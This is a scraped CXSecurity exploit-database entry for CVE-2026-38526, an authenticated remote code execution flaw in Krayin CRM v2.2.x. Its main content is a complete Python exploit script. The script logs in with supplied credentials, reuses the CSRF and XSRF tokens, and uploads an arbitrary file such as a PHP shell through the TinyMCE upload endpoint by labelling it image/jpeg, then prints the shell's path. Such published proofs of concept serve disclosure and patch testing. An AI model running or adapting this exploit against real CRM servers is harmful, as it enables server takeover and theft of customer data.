---
title: Krayin CRM v2.2.x Authenticated Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2026070006
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-07-19
fetch_date: 2026-07-20T05:32:06.242499
---

# Krayin CRM v2.2.x Authenticated Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Krayin CRM v2.2.x Authenticated Remote Code Execution** **2026.07.19**  Credit:  **[Diamorphine](https://cxsecurity.com/author/Diamorphine/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-38526](https://cxsecurity.com/cveshow/CVE-2026-38526/ "Click to see CVE-2026-38526")**  CWE: **N/A** | |

# Exploit Title: Krayin CRM v2.2.x - Authenticated Remote Code Execution
# Date: 07/05/2026
# Exploit Author: Diamorphine
# Vendor Homepage: https://krayincrm.com
# Software Link: https://github.com/krayin/laravel-crm
# Version: 2.2.x
# Tested on: Debian
# CVE : CVE-2026-38526
import asyncio
import httpx
from urllib.parse import \*
import argparse
from bs4 import BeautifulSoup
import json
async def main(url, user, password, file):
async with httpx.AsyncClient(verify=False) as client:
url\_login = urljoin(url, "/admin/login")
upload\_url = urljoin(url, "/admin/tinymce/upload")
get\_tokens = await client.get(url=url\_login)
soup = BeautifulSoup(get\_tokens.text, 'html.parser')
\_token = soup.find('input').get('value')
login\_data = {
"\_token": \_token,
"email": user,
"password": password
}
login\_r = await client.post(url=url\_login, data=login\_data)
xsrf\_token = login\_r.cookies.get("XSRF-TOKEN")
headers = {
"X-XSRF-TOKEN": unquote(xsrf\_token)
}
with open(file, 'rb') as o\_file:
r = await client.post(url=upload\_url, files={"file": (o\_file.name, o\_file, "image/jpeg")}, headers=headers)
if r.status\_code == 200:
exploit\_url = r.json().get('location')
print(f'[+] File uploaded successfully.\nPath to file: {exploit\_url}')
else:
print('[-] File not uploaded.')
parser = argparse.ArgumentParser(description="Exploit for CVE-2026-38526, authenticated file upload.")
parser.add\_argument('-t', '--target', required=True, help="Target url. E.g. http://127.0.0.1")
parser.add\_argument('-u', '--user', required=True, help="Email.")
parser.add\_argument('-p', '--password', required=True, help="Password.")
parser.add\_argument('-f', '--file', required=True, help="File to upload (/home/user/shell.php).")
args = parser.parse\_args()
if \_\_name\_\_ == '\_\_main\_\_':
asyncio.run(main(args.target, args.user, args.password, args.file))

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026070006)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top